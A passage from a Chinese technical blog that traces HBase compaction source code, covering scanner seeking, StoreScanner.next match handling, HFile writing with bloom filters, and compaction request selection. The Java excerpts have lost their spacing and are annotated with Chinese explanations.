cur = hfs.getKeyValue();
 
 
 
return !hasMVCCInfo ? true : skipKVsNewerThanReadpoint();
 
 } finally {
 
realSeekDone = true;
 
 }
 
 } catch (IOException ioe) {
 
thrownewIOException("Could not seek " + this + " to key " + key, ioe);
 
 }
 
 }
 
调用HFileScanner的实现HFileReaderV2.EncodedScannerV2 or HFileReaderV2.ScannerV2的seekTo方法
 
publicstaticbooleanseekAtOrAfter(HFileScanners, KeyValue k)
 
throws IOException {
 
调用下面会提到的HFileReaderV2.AbstractScannerV2.seekTo方法
 
如果返回的值==0表示刚好对应上，直接返回true,不需要在进行next操作(当前的kv就是对的kv)
 
 
 
intresult = s.seekTo(k.getBuffer(), k.getKeyOffset(), k.getKeyLength());
 
if(result < 0) {
 
小米搞的一个对index中存储的key的优化，HBASE-7845
 
indexkey的值在小米的hbase-7845进行了优化，
 
 存储的key是大于上一个block的最后一个key与小于当前block第一个key的一个值,如果是此值返回的值为-2
 
 此时不需要像其它小于0的情况把当前的kv向下移动一个指针位，因为当前的值已经在第一位上
 
if (result == HConstants.INDEX_KEY_MAGIC) {
 
// using faked key
 
returntrue;
 
 }
 
移动到文件的第一个block的开始位置,此部分代码通常不会被执行
 
// Passed KV is smaller than first KV in file, work from start of file
 
returns.seekTo();
 
 } elseif(result > 0) {
 
当前scan的startkey小于当前的block的currentkey，移动到下一条数据
 
// Passed KV is larger than current KV in file, if there is a next
 
// it is the "after", if not then this scanner is done.
 
returns.next();
 
 }
 
// Seeked to the exact key
 
returntrue;
 
 }
 
HFileReaderV2.AbstractScannerV2.seekTo方法
 
publicintseekTo(byte[] key, intoffset, intlength) throws IOException {
 
// Always rewind to the first key of the block, because the given key
 
// might be before or after the current key.
 
returnseekTo(key, offset, length, true);
 
 }
 
seekTo的嵌套调用
 
protectedintseekTo(byte[] key, intoffset, intlength, booleanrewind)
 
throws IOException {
 
得到HFileReaderV2中的block索引的reader实例，HFileBlockIndex.BlockIndexReader
 
 
 
 HFileBlockIndex.BlockIndexReader indexReader =
 
reader.getDataBlockIndexReader();
 
 
 
从blockindexreader中得到key对应的HFileBlock信息，
 
每一个block的第一个key都存储在meta的block中在reader的blockKeys,
 
indexkey的值在小米的hbase-7845进行了优化，
 
 存储的key是大于上一个block的最后一个key与小于当前block第一个key的一个值
 
同时存储有此block对应的offset(在reader的blockOffsets)与block size大小(在reader的blockDataSizes)
 
1.通过二分查找到meta block的所有key中比较，得到当前scan的startkey对应的block块的下标值
 
2.通过下标拿到block的开始位置，
 
3.通过下标拿到block的大小
 
4.加载对应的block信息，并封装成BlockWithScanInfo实例返回
 
 
 
 BlockWithScanInfo blockWithScanInfo =
 
indexReader.loadDataBlockWithScanInfo(key, offset, length, block,
 
cacheBlocks, pread, isCompaction);
 
if (blockWithScanInfo == null || blockWithScanInfo.getHFileBlock() == null) {
 
// This happens if the key e.g. falls before the beginning of the file.
 
return -1;
 
 }
 
调用HFileReaderV2.EncodedScannerV2 or HFileReaderV2.ScannerV2 的loadBlockAndSeekToKey方法
 
1.更新当前的block块为seek后的block块，
 
2.把指标移动到指定的key的指针位置。
 
 
 
returnloadBlockAndSeekToKey(blockWithScanInfo.getHFileBlock(),
 
blockWithScanInfo.getNextIndexedKey(), rewind, key, offset, length, false);
 
 }
 
 
 
执行StoreScanner.next方法处理
 
回到DefaultCompactor.compact的代码内,得到scanner后，要执行的写入新storefile文件的操作。
 
 
 
writer = store.createWriterInTmp(fd.maxKeyCount, this.compactionCompression, true,
 
fd.maxMVCCReadpoint >= smallestReadPoint);
 
booleanfinished = performCompaction(scanner, writer, smallestReadPoint);
 
 
 
在performcompaction中通过StoreScanner.next(kvlist,limit)读取kv数据，
 
 其中limit的大小通过hbase.hstore.compaction.kv.max配置，默认值为10,太大可能会出现oom的情况
 
 通过HFileWriterV2.append添加kv到新的storefile文件中。
 
 通过hbase.hstore.close.check.interval配置写入多少数据后检查一次store是否是可写的状态，
 
 默认10*1000*1000(10m)
 
 
 
StoreScanner.next(kvlist,limit)：
 
 
 
publicbooleannext(List<Cell> outResult, intlimit) throws IOException {
 
lock.lock();
 
try {
 
if (checkReseek()) {
 
returntrue;
 
 }
 
 
 
// if the heap was left null, then the scanners had previously run out anyways, close and
 
// return.
 
if (this.heap == null) {
 
close();
 
returnfalse;
 
 }
 
通过调用KeyValueHeap.peek-->StoreFileScanner.peek,得到当前seek后的keyvalue
 
如果当前的keyvalue为null,表示没有要查找的数据了,结束此次scan
 
 KeyValue peeked = this.heap.peek();
 
if (peeked == null) {
 
close();
 
returnfalse;
 
 }
 
 
 
// only call setRow if the row changes; avoids confusing the query matcher
 
// if scanning intra-row
 
byte[] row = peeked.getBuffer();
 
intoffset = peeked.getRowOffset();
 
shortlength = peeked.getRowLength();
 
此处的if检查通常在第一次运行时，或者说已经不是在一行查询内时，会进行,设置matcher.row为当前行的rowkey
 
if (limit < 0 || matcher.row == null || !Bytes.equals(row, offset, length, matcher.row,
 
matcher.rowOffset, matcher.rowLength)) {
 
this.countPerRow = 0;
 
matcher.setRow(row, offset, length);
 
 }
 
 
 
 KeyValue kv;
 
 KeyValue prevKV = null;
 
 
 
// Only do a sanity-check if store and comparator are available.
 
 KeyValue.KVComparator comparator =
 
store != null ? store.getComparator() : null;
 
 
 
intcount = 0;
 
 LOOP: while((kv = this.heap.peek()) != null) {
 
 ++kvsScanned;
 
// Check that the heap gives us KVs in an increasing order.
 
assertprevKV == null || comparator == null || comparator.compare(prevKV, kv) <= 0 :
 
"Key " + prevKV + " followed by a " + "smaller key " + kv + " in cf " + store;
 
prevKV = kv;
 
检查kv：
 
1.过滤filter.filterAllRemaining()==true,表示结束查询,返回DONE_SCAN
 
2.检查matcher中的rowkey(row属性，表示当前查找的所有kv在相同行),
 
 如果matcher.row小于当前的peek的kv,表示当前row的查找结束(current kv已经在下一行,返回DONE)
 
 如果matcher.row大于当前的peek的kv,peek出来的kv比matcher.row小，需要seek到下一行，返回SEEK_NEXT_ROW。
 
3.检查ttl是否过期，如果过期返回SEEK_NEXT_COL。
 
4.如果是minor的compact的scan,这时的scantype为COMPACT_RETAIN_DELETES，返回INCLUDE。
 
5.如果kv非delete的类型，同时在deletes（ScanDeleteTracker）中包含此条数据
 
 如果删除类型为FAMILY_DELETED/COLUMN_DELETED,那么返回SEEK_NEXT_COL。
 
 如果删除类型为VERSION_DELETED/FAMILY_VERSION_DELETED,那么返回SKIP。
 
6.检查timestamp的值是否在TimeRange的范围内。如果超过最大值，返回SKIP，否则返回SEEK_NEXT_COL。
 
7.执行filter.filterKeyValue().
 
 如果filter返回为SKIP，直接返回SKIP。
 
 如果filter返回为NEXT_COL，返回SEEK_NEXT_COL。
 
 如果filter返回为NEXT_ROW，返回SEEK_NEXT_ROW。
 
 如果filter返回为SEEK_NEXT_USING_HINT，返回SEEK_NEXT_USING_HINT。
 
 否则表示filter返回为INCLUDE或INCLUDE AND SEEK NEXT,执行下面流程
 
8.检查如果非delete类型的kv，是否超过maxVersion，如果是，或者数据ttl过期，返回SEEK_NEXT_ROW。
 
 如果数据没有过期，同时没有超过maxVersion,同时filter返回为INCLUDE_AND_NEXT_COL。
 
 返回INCLUDE_AND_SEEK_NEXT_COL。否则返回INCLUDE。
 
 ScanQueryMatcher.MatchCodeqcode = matcher.match(kv);
 
switch(qcode) {
 
caseINCLUDE:
 
caseINCLUDE_AND_SEEK_NEXT_ROW:
 
caseINCLUDE_AND_SEEK_NEXT_COL:
 
执行filter的transformCell操作，此处可以想办法让KV的值最可能的小，减少返回的值大小。
 
Filterf = matcher.getFilter();
 
if (f != null) {
 
// TODO convert Scan Query Matcher to be Cell instead of KV based ?
 
kv = KeyValueUtil.ensureKeyValue(f.transformCell(kv));
 
 }
 
 
 
this.countPerRow++;
 
此时是compact的scan,storeLimit为-1,storeOffset为0，此处的if检查不会执行
 
if (storeLimit > -1 &&
 
this.countPerRow > (storeLimit + storeOffset)) {
 
// do what SEEK_NEXT_ROW does.
 
if (!matcher.moreRowsMayExistAfter(kv)) {
 
returnfalse;
 
 }
 
reseek(matcher.getKeyForNextRow(kv));
 
break LOOP;
 
 }
 
把数据添加到返回的列表中。可通过storeLimit与storeOffset来设置每一个store查询的分页值。
 
前提是只有一个cf，只有一个kv的情况下
 
// add to results only if we have skipped #storeOffset kvs
 
// also update metric accordingly
 
if (this.countPerRow > storeOffset) {
 
outResult.add(kv);
 
count++;
 
 }
 
 
 
if (qcode == ScanQueryMatcher.MatchCode.INCLUDE_AND_SEEK_NEXT_ROW) {
 
检查是否有下一行数据，也就是检查当前的kv是否达到stop的kv值。
 
if (!matcher.moreRowsMayExistAfter(kv)) {
 
returnfalse;
 
 }
 
移动到当前kv的后面，通过kv的rowkey部分，加上long.minvalue,
 
 把cf与column的值都设置为null，这个值就是最大的kv,kv的比较方式可参见KeyValue.KVComparator
 
 
 
reseek(matcher.getKeyForNextRow(kv));
 
 } elseif (qcode == ScanQueryMatcher.MatchCode.INCLUDE_AND_SEEK_NEXT_COL) {
 
 
 
由于此时是compaction的next col，所以直接移动到下一行去了。
 
否则得到下一个column的列名，移动到下一个列的数据前。见ScanQueryMatcher.getKeyForNextColumn方法
 
 
 
reseek(matcher.getKeyForNextColumn(kv));
 
 } else {
 
否则是include，直接移动到下一行
 
this.heap.next();
 
 }
 
 
 
if (limit > 0 && (count == limit)) {
 
如果达到limit的值，跳出while
 
break LOOP;
 
 }
 
continue;
 
 
 
caseDONE:
 
当前row查询结束
 
returntrue;
 
 
 
caseDONE_SCAN:
 
结束本次的SCAN操作
 
close();
 
returnfalse;
 
 
 
caseSEEK_NEXT_ROW:
 
计算出当前的ROW的后面位置，也就是比当前的KV大，比下一行的KV小，并通过
 
reseek-->StoreFileScanner.reseek-->HFile.seekTo移动到下一个大于此row的kv上
 
// This is just a relatively simple end of scan fix, to short-cut end
 
// us if there is an endKey in the scan.
 
if (!matcher.moreRowsMayExistAfter(kv)) {
 
returnfalse;
 
 }
 
 
 
reseek(matcher.getKeyForNextRow(kv));
 
break;
 
 
 
caseSEEK_NEXT_COL:
 
计算出比当前KV大的下一列的KV值，移动到下一个KV上
 
reseek(matcher.getKeyForNextColumn(kv));
 
break;
 
 
 
caseSKIP:
 
执行StoreScanner.KeyValueHeap.next
 
this.heap.next();
 
break;
 
 
 
caseSEEK_NEXT_USING_HINT:
 
如果存在下一列(kv),移动到下一个KV上，否则执行StoreScanner.KeyValueHeap.next
 
// TODO convert resee to Cell?
 
 KeyValue nextKV = KeyValueUtil.ensureKeyValue(matcher.getNextKeyHint(kv));
 
if (nextKV != null) {
 
reseek(nextKV);
 
 } else {
 
heap.next();
 
 }
 
break;
 
 
 
default:
 
thrownewRuntimeException("UNEXPECTED");
 
 }
 
 }
 
 
 
if (count > 0) {
 
returntrue;
 
 }
 
 
 
// No more keys
 
close();
 
returnfalse;
 
 } finally {
 
lock.unlock();
 
 }
 
 }
 
 
 
KeyValueHeap.next方法流程：
 
 
 
 public KeyValue next() throws IOException {
 
if(this.current == null) {
 
returnnull;
 
 }
 
得到当前队列中top的StoreFileScanner中的current kv的值，并把top的scanner指针向下移动到下一个kv的位置
 
 KeyValue kvReturn = this.current.next();
 
得到移动后的top的current(此时是kvReturn的下一个kv的值)
 
 KeyValue kvNext = this.current.peek();
 
如果next kv的值是null,表示top的scanner已经移动到文件的尾部，关闭此scanner,重新计算队列中的top
 
if (kvNext == null) {
 
this.current.close();
 
this.current = pollRealKV();
 
 } else {
 
重新计算出current top的scanner
 
KeyValueScannertopScanner = this.heap.peek();
 
if (topScanner == null ||
 
this.comparator.compare(kvNext, topScanner.peek()) >= 0) {
 
this.heap.add(this.current);
 
this.current = pollRealKV();
 
 }
 
 }
 
returnkvReturn;
 
 }
 
 
 
compaction时storefile合并的新storefile写入流程
 
 
 
回到DefaultCompactor.compact的代码内,-->performcompaction(在DefaultCompactor的上级类中Compactor)
 
在performcompaction中通过StoreScanner.next(kvlist,limit)读取kv数据，
 
 其中limit的大小通过hbase.hstore.compaction.kv.max配置，默认值为10,太大可能会出现oom的情况
 
 通过HFileWriterV2.append添加kv到新的storefile文件中。
 
 通过hbase.hstore.close.check.interval配置写入多少数据后检查一次store是否是可写的状态，
 
 默认10*1000*1000(10m)
 
在每next一条数据后，一条数据包含多个column,所以会有多个kv的值。通过如下代码写入到新的storefile
 
 do {
 
查找一行数据
 
hasMore = scanner.next(kvs, compactionKVMax);
 
// output to writer:
 
for (Cellc : kvs) {
 
 KeyValue kv = KeyValueUtil.ensureKeyValue(c);
 
if (kv.getMvccVersion() <= smallestReadPoint) {
 
kv.setMvccVersion(0);
 
 }
 
执行写入操作
 
writer.append(kv);
 
 ++progress.currentCompactedKVs;
 
.................................此处省去一些代码
 
kvs.clear();
 
 } while (hasMore);
 
 
 
通过writer实例append kv到新的storefile中，writer实例通过如下代码生成：
 
在DefaultCompactor.compact方法代码中：
 
 
 
writer = store.createWriterInTmp(fd.maxKeyCount, this.compactionCompression, true,
 
fd.maxMVCCReadpoint >= smallestReadPoint);
 
 
 
Hstore.createWriterIntmp-->StoreFile.WriterBuilder.build生成StoreFile.Writer实例，
 
 此实例中引用的具体writer实例为HFileWriterV2，
 
 通过hfile.format.version配置，writer/reader的具体的版本，目前只能配置为2
 
 
 
HstoreFile.Writer.append(kv)流程：
 
 
 
publicvoidappend(final KeyValue kv) throws IOException {
 
写入到bloomfilter中,如果kv与上一次写入的kv的row/rowcol的值是相同的，不写入，
 
 保证每次写入到bloomfilter中的数据都是不同的row或rowcol
 
 通过io.storefile.bloom.block.size配置bloomblock的大小，默认为128*1024
 
 
 
appendGeneralBloomfilter(kv);
 
 
 
如果kv是一个delete的kv，把row写入到delete的bloomfilter block中。
 
 同一个行的多个kv只添加一次，要添加到此bloomfilter中，kv的delete type要是如下类型：
 
 kv.isDeleteFamily==true,同时kv.isDeleteFamilyVersion==true
 
 
 
appendDeleteFamilyBloomFilter(kv);
 
 
 
把数据写入到HFileWriterV2的output中。计算出此storefile的最大的timestamp(所有append的kv中最大的mvcc值)
 
hfilev2的写入格式:klen(int) vlen(int) key value
 
hfilev2的key的格式:klen(int) vlen(int) 
 
 rowlen(short) row cflen(byte) 
 
 cf column timestamp(long) type(byte)
 
每次append的过程中会检查block是否达到flush的值，
 
 如果达到cf中配置的BLOCKSIZE的值，默认为65536,执行finishBlock操作写入数据，
 
 同时写入此block的bloomfilter.生成一个新的block
 
 
 
writer.append(kv);
 
 
 
更新此storefile的包含的timestamp的范围，也就是更新最大／最小值
 
 
 
trackTimestamps(kv);
 
 }
 
 
 
完成数据读取与写入操作后，回到DefaultCompactor.compact方法中，关闭writer实例
 
if (writer != null) {
 
writer.appendMetadata(fd.maxSeqId, request.isMajor());
 
writer.close();
 
newFiles.add(writer.getPath());
 
 }
 
添加此storefile的最大的seqid到fileinfo中。StoreFile.Writer中的方法
 
publicvoidappendMetadata(finallongmaxSequenceId, finalbooleanmajorCompaction)
 
throws IOException {
 
writer.appendFileInfo(MAX_SEQ_ID_KEY, Bytes.toBytes(maxSequenceId));
 
是否执行的majorCompaction
 
writer.appendFileInfo(MAJOR_COMPACTION_KEY,
 
 Bytes.toBytes(majorCompaction));
 
appendTrackedTimestampsToMetadata();
 
 }
 
 
 
publicvoidappendTrackedTimestampsToMetadata() throws IOException {
 
appendFileInfo(TIMERANGE_KEY,WritableUtils.toByteArray(timeRangeTracker));
 
appendFileInfo(EARLIEST_PUT_TS, Bytes.toBytes(earliestPutTs));
 
 }
 
 
 
publicvoidclose() throws IOException {
 
以下两行代码作用于添加相关信息到fileinfo中,see 下面的两个方法流程,不说明。
 
booleanhasGeneralBloom = this.closeGeneralBloomFilter();
 
booleanhasDeleteFamilyBloom = this.closeDeleteFamilyBloomFilter();
 
 
 
writer.close();
 
 
 
// Log final Bloom filter statistics. This needs to be done after close()
 
// because compound Bloom filters might be finalized as part of closing.
 
if (StoreFile.LOG.isTraceEnabled()) {
 
 StoreFile.LOG.trace((hasGeneralBloom ? "" : "NO ") + "General Bloom and " +
 
 (hasDeleteFamilyBloom ? "" : "NO ") + "DeleteFamily" + " was added to HFile " +
 
getPath());
 
 }
 
 
 
 }
 
 
 
privatebooleancloseGeneralBloomFilter() throws IOException {
 
booleanhasGeneralBloom = closeBloomFilter(generalBloomFilterWriter);
 
 
 
// add the general Bloom filter writer and append file info
 
if (hasGeneralBloom) {
 
writer.addGeneralBloomFilter(generalBloomFilterWriter);
 
writer.appendFileInfo(BLOOM_FILTER_TYPE_KEY,
 
 Bytes.toBytes(bloomType.toString()));
 
if (lastBloomKey != null) {
 
writer.appendFileInfo(LAST_BLOOM_KEY, Arrays.copyOfRange(
 
lastBloomKey, lastBloomKeyOffset, lastBloomKeyOffset
 
 + lastBloomKeyLen));
 
 }
 
 }
 
returnhasGeneralBloom;
 
 }
 
 
 
privatebooleancloseDeleteFamilyBloomFilter() throws IOException {
 
booleanhasDeleteFamilyBloom = closeBloomFilter(deleteFamilyBloomFilterWriter);
 
 
 
// add the delete family Bloom filter writer
 
if (hasDeleteFamilyBloom) {
 
writer.addDeleteFamilyBloomFilter(deleteFamilyBloomFilterWriter);
 
 }
 
 
 
// append file info about the number of delete family kvs
 
// even if there is no delete family Bloom.
 
writer.appendFileInfo(DELETE_FAMILY_COUNT,
 
 Bytes.toBytes(this.deleteFamilyCnt));
 
 
 
returnhasDeleteFamilyBloom;
 
 }
 
 
 
HFileWriterV2.close()方法流程：
 
写入用户数据/写入bloomfilter的数据，写入datablockindex的数据，更新写入fileinfo,
 
 写入FixedFileTrailer到文件最后。
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
compact处理流程分析, hongs-yang.iteye.com.blog.2051525, Mon, 21 Apr 2014 21:05:54 +0800

compact处理流程分析
 
compact的处理与split相同，由client端与flush时检查发起。
 
针对compact还有一个在rs生成时生成的CompactionChecker线程定期去检查是否需要做compact操作
 
线程执行的间隔时间通过hbase.server.thread.wakefrequency配置，默认为10*1000ms
 
CompactionChecker线程主要作用：
 
生成通过hbase.server.thread.wakefrequency(10*1000ms)配置的定期检查region是否需要compact的检查线程,
 
如果需要进行compact,会在此处通过compact的线程触发compcat的请求
 
此实例中通过hbase.server.thread.wakefrequency(10*1000ms)配置major compact的优先级,
 
 如果major compact的优先级大过此值,把compact的优先级设置为此值.
 
Store中通过hbase.server.compactchecker.interval.multiplier配置多少时间需要进行compact检查的间隔
 
 默认为1000ms,
 
compactionChecker的检查周期为wakefrequency*multiplier ms,
 
 也就是默认情况下线程调用1000次执行一次compact检查
 
a.compaction检查时发起compact的条件是
 
 如果一个store中所有的file个数减去在做(或发起compact请求)的个数，大于或等于
 
 hbase.hstore.compaction.min配置的值,
 
老版本使用hbase.hstore.compactionThreshold进行配置,默认值为3
 
b.major compact的条件检查
 
通过hbase.hregion.majorcompaction配置major的检查周期,default=1000*60*60*24
 
通过hbase.hregion.majorcompaction.jitter配置major的浮动时间,默认为0.2,
 
 也就是major的时间上下浮动4.8小时
 
b2.检查(当前时间-major配置时间>store最小的文件生成时间)表示需要major,
 
 b2.1>store下是否只有一个文件,同时这个文件已经到了major的时间,
 
 b2.1>检查ttl时间是否达到(intager.max表示没配置),达到ttl时间需要major,否则不做
 
 b2.2>文件个数大于1,到达major的时间,需要major
 
 
 
Client端发起compactRegion的request
 
Client通过HBaseAdmin.compact发起regionserver的rpc连接，调用regionserver.compactRegion
 
如果传入的是tablename而不是regionname,会迭代出此table的所有region调用HRegionServer.compactRegion
 
由client发起，调用HRegionServer.compactRegion
 
 public CompactRegionResponse compactRegion(final RpcController controller,
 
final CompactRegionRequest request) throws ServiceException {
 
try {
 
checkOpen();
 
requestCount.increment();
 
从onlineRegions中得到request的Hregion实例
 
 HRegion region = getRegion(request.getRegion());
 
region.startRegionOperation(Operation.COMPACT_REGION);
 
LOG.info("Compacting " + region.getRegionNameAsString());
 
booleanmajor = false;
 
byte [] family = null;
 
Storestore = null;
 
如果client发起的request中传入有columnfamily的值，得到此cf的HStore
 
if (request.hasFamily()) {
 
family = request.getFamily().toByteArray();
 
store = region.getStore(family);
 
if (store == null) {
 
thrownewServiceException(newIOException("column family " + Bytes.toString(family) +
 
" does not exist in region " + region.getRegionNameAsString()));
 
 }
 
 }
 
检查是否是major的compact请求
 
if (request.hasMajor()) {
 
major = request.getMajor();
 
 }
 
如果是发起majorcompaction的操作，
 
if (major) {
 
if (family != null) {
 
store.triggerMajorCompaction();
 
 } else {
 
region.triggerMajorCompaction();
 
 }
 
 }
 
 
 
 String familyLogMsg = (family != null)?" for column family: " + Bytes.toString(family):"";
 
LOG.trace("User-triggered compaction requested for region " +
 
region.getRegionNameAsString() + familyLogMsg);
 
 String log = "User-triggered " + (major ? "major " : "") + "compaction" + familyLogMsg;
 
否则是一般compation的请求，通过compactsplitThread.requestCompaction发起compact request
 
if(family != null) {
 
compactSplitThread.requestCompaction(region, store, log,
 
Store.PRIORITY_USER, null);
 
 } else {
 
compactSplitThread.requestCompaction(region, log,
 
Store.PRIORITY_USER, null);
 
 }
 
return CompactRegionResponse.newBuilder().build();
 
 } catch (IOException ie) {
 
thrownewServiceException(ie);
 
 }
 
 }
 
 
 
非major的compact处理流程
 
requestCompaction不管是直接传入sotre或者是region的传入，
 
如果传入的是region,那么会拿到region下的所有store，迭代调用每一个store的compaction request操作。
 
所有的非major compaction request最终会通过如下方法发起compaction request
 
private synchronized CompactionRequest requestCompactionInternal(final HRegion r,
 
 final Store s,
 
final String why, intpriority, CompactionRequest request, booleanselectNow)
 
 
 
针对store的compaction request处理流程
 
如果要对一个HBASE的表禁用掉compaction操作，可以通过create table时配置COMPACTION_ENABLED属性
 
 private synchronized CompactionRequest requestCompactionInternal(final HRegion r, final Store s,
 
final String why, intpriority, CompactionRequest request, booleanselectNow)
 
throws IOException {
 
if (this.server.isStopped()
 
 || (r.getTableDesc() != null && !r.getTableDesc().isCompactionEnabled())) {
 
returnnull;
 
 }
 
 
 
CompactionContextcompaction = null;
 
 
 
此时的调用selectNow为true,(如果是系统调用，此时的selectNow为false,)
 
 也就是在发起request到CompactSplitThread.CompactionRunner线程执行时，
 
 如果是系统调用,传入的CompactionContext的实例为null,否则是用户发起的调用在这个地方得到compaction实例
 
 
 
if (selectNow) {
 
通过HStore.requestCompaction得到一个compactionContext,计算要进行compact的storefile
 
并设置其request.priority为Store.PRIORITY_USER表示用户发起的request
 
如果是flush时发起的compact，
 
 并设置其request.priority为hbase.hstore.blockingStoreFiles配置的值减去storefile的个数,
 
 表示系统发起的request,
 
 如果hbase.hstore.blockingStoreFiles配置的值减去storefile的个数==PRIORITY_USER
 
那么priority的值为PRIORITY_USER+1
 
 见生成CompactionRequest实例
 
compaction = selectCompaction(r, s, priority, request);
 
if (compaction == null) returnnull; // message logged inside
 
 }
 
 
 
// We assume that most compactions are small. So, put system compactions into small
 
// pool; we will do selection there, and move to large pool if necessary.
 
longsize = selectNow ? compaction.getRequest().getSize() : 0;
 
 
 
此时好像一直就得不到largeCompactions的实例(在system时通过CompactionRunner线程检查)，
 
 因为selectNow==false时，size的大小为0
 
 不可能大于hbase.regionserver.thread.compaction.throttle配置的值
 
 此配置的默认值是hbase.hstore.compaction.max*2*memstoresize
 
 
 
 ThreadPoolExecutor pool = (!selectNow && s.throttleCompaction(size))
 
 ? largeCompactions : smallCompactions;
 
 
 
通过smallCompactions的线程池生成CompactionRunner线程并执行,见执行Compaction的处理线程
 
 
 
pool.execute(newCompactionRunner(s, r, compaction, pool));
 
if (LOG.isDebugEnabled()) {
 
 String type = (pool == smallCompactions) ? "Small " : "Large ";
 
LOG.debug(type + "Compaction requested: " + (selectNow ? compaction.toString() : "system")
 
 + (why != null && !why.isEmpty() ? "; Because: " + why : "") + "; " + this);
 
 }
 
returnselectNow ? compaction.getRequest() : null;
 
 }
 
 
 
生成CompactionRequest实例
 
Hstore.requestcompaction得到要进行compact的storefile,并生成一个CompactionContext
 
 public CompactionContext requestCompaction(int priority, CompactionRequest baseRequest)
 
throws IOException {
 
// don't even select for compaction if writes are disabled
 
if (!this.areWritesEnabled()) {
 
returnnull;
 
 }
 
生成一个DefaultStoreEngine.DefaultCompactionContext实例(如果storeEngine是默认的配置)
 
CompactionContextcompaction = storeEngine.createCompaction();
 
this.lock.readLock().lock();
 
try {
 
synchronized (filesCompacting) {
 
// First, see if coprocessor would want to override selection.
 
if (this.getCoprocessorHost() != null) {
 
List<StoreFile> candidatesForCoproc = compaction.preSelect(this.filesCompacting);
 
booleanoverride = this.getCoprocessorHost().preCompactSelection(
 
this, candidatesForCoproc, baseRequest);
 
if (override) {
 
// Coprocessor is overriding normal file selection.
 
compaction.forceSelect(newCompactionRequest(candidatesForCoproc));
 
 }
 
 }
 
 
 
// Normal case - coprocessor is not overriding file selection.
 
if (!compaction.hasSelection()) {
 
如果是client端发起的compact,此时的值为true,如果是flush时发起的compact，此时的值为false
 
 
 
booleanisUserCompaction = priority == Store.PRIORITY_USER;
 
 
 
offPeakHours的值说明：
 
1.通过hbase.offpeak.start.hour配置major的启动开始小时，如配置为1
 
2.通过hbase.offpeak.end.hour配置major的启动结束小时，如配置为2
 
如果启动时间是1与2配置的小时时间内,那么配置有这两个值后，
 
主要用来检查compact的文件的大小是否超过hbase.hstore.compaction.max配置的值，默认为10，
 
 减去1个文件的总和的多少倍，
 
如：有10个待做compact的文件,第一个文件(i=0)的size是=i+max(10)-1=9，
 
 以上表示第一个文件的size超过了后面9个文件总size的大小的多少倍，如果超过了倍数，不做compact
 
如果1与2配置为不等于-1,同时start小于end,当前做compact的时间刚好在此时间内，
 
多少倍这个值通过hbase.hstore.compaction.ratio.offpeak配置得到，默认为5.0f
 
否则通过hbase.hstore.compaction.ratio配置得到，默认为1.2f
 
 
 
booleanmayUseOffPeak = offPeakHours.isOffPeakHour() &&
 
offPeakCompactionTracker.compareAndSet(false, true);
 
try {
 
 
 
调用DefaultStoreEngine.DefaultCompactionContext实例的select方法，返回true/false,
 
对compaction.select的具体分析说明可参见major的compact处理流程
 
 
 
 true表示有compactrequest,否则表示没有compactrequest
 
 此方法最终调用RatioBasedCompactionPolicy.selectCompaction方法，
 
 生成CompactRequest并放入到DefaultStoreEngine.DefaultCompactionContext的request属性中
 
 得到要compact的storefile列表，放入到HStore.filesCompacting列表中
 
 方法传入的forceMajor实例只有在发起major compact时同时fileCompacting列表中没有值时，此值为true,
 
 其它情况值都为false.就是最后一个参数的值为false
 
a.在compaction.select方法中得到此store中所有的storefile列表，
 
 传入到compactionPolicy.selectCompaction方法中。
 
RatioBasedCompactionPolicy.selectCompaction方法处理流程：
 
1.检查所有的storefile的个数减去正在做compact的storefile文件个数
 
 是否大于hbase.hstore.blockingStoreFiles配置的值，默认为7,
 
 比对方法：
 
 a.如果filesCompacting(正在做compact的storefile列表)不为空
 
 那么storefiles的个数减去正在做compact的storefile文件个数加1是否大于blockingStoreFiles配置的值
 
 b.如果filesCompacting(正在做compact的storefile列表)为空
 
 那么storefiles的个数减去正在做compact的storefile文件个数是否大于blockingStoreFiles配置的值
 
2.从所有的storefile列表中移出正在做compcat的storefile列表(fileCompacting列表中的数据)
 
 得到还没做(可选的)compact的storefiles列表
 
3.如果columnfamily配置中的MIN_VERSIONS的值没有配置(=0)，
 
 得到TTL配置的值(不配置=Integer.MAX_VALUE=-1)配置的值为秒为单位，否则得到Long.MAX_VALUE
 
4.检查如果hbase.store.delete.expired.storefile配置的值为true(default=true),同时ttl非默认值
 
 从2中得到的storefile列表中得到ttl超时的所有storefile列表。
 
 4.1如果有ttl过期的storefile，生成这些storefile的CompactionRequest请求并返回
 
 4.2如果没有ttl过期的storefile,(控制大文件先不做小的compact)
 
 把storefile列表中size超过hbase.hstore.compaction.max.size配置的storefile移出，默认为Long.MAX_VALUE
 
5.检查storefile是否需要做major compact操作，
 
 5.1得到通过hbase.hregion.majorcompaction配置的值默认为1000*60*60*24*7
 
 5.2得到通过hbase.hregion.majorcompaction.jitter配置的值，默认为0.5f
 
 5.3检查storefile中最先更新的storefile的更新时间是否在5.1与5.2配置的时间内(默认是3.5天到7天之间)
 
 如果配置为24小时，那么执行时间的加减为4.8个小时
 
 5.4如果还没有超过配置的时间，表示不需要发做major compact,
 
 5.5如果在时间范围内或超过此配置的时间，表示需要做major compact,
 
 a.同时如果只有一个storefile此storefile的最小更新时间已经超过了ttl的配置时间，需要做major compact
 
 b.如果有多个storefile文件，表示需要做major compat.
 
6.检查是否需要做compact还有一个条件，在5成立的条件下，
 
 如果当前要做compact的storefile的个数小于hbase.hstore.compaction.max配置的值，默认10，
 
5与6的检查条件都成立，或者此region (有个split操作，有References文件),，表示升级为major的compact
如果没有升级成major的compact，把storefile列表中的bluk load的file移出
计算出最大的几个storefile,也就是file size的值是后面几个文件的size的多少倍，
 把超过倍数的storefile移出，不做compact
可以看上面对offPeakHours的值说明：
 
 
 
10. 如果现在还有需要做compcat的storefile列表，检查文件个数是否达到最小compact的配置的值，
 
 通过hbase.hstore.compaction.min配置，默认为3,老版本通过hbase.hstore.compactionThreshold配置
 
 如果没有达到最小的配置值，不做compact
 
11.如果没有升级到major，把超过hbase.hstore.compaction.max配置的storefile移出列表。默认配置为10
 
 
 
12.生成并返回一个CompactionRequest的实例。如果非major,同时在offPeakHours的值说明的时间内，
 
 把CompactionRequest的isOffPeak设置为true,否则设置为false(major)
 
 
 
compaction.select(this.filesCompacting, isUserCompaction,
 
mayUseOffPeak, forceMajor && filesCompacting.isEmpty());
 
 } catch (IOException e) {
 
if (mayUseOffPeak) {
 
offPeakCompactionTracker.set(false);
 
 }
 
throwe;
 
 }
 
assertcompaction.hasSelection();
 
if (mayUseOffPeak && !compaction.getRequest().isOffPeak()) {
 
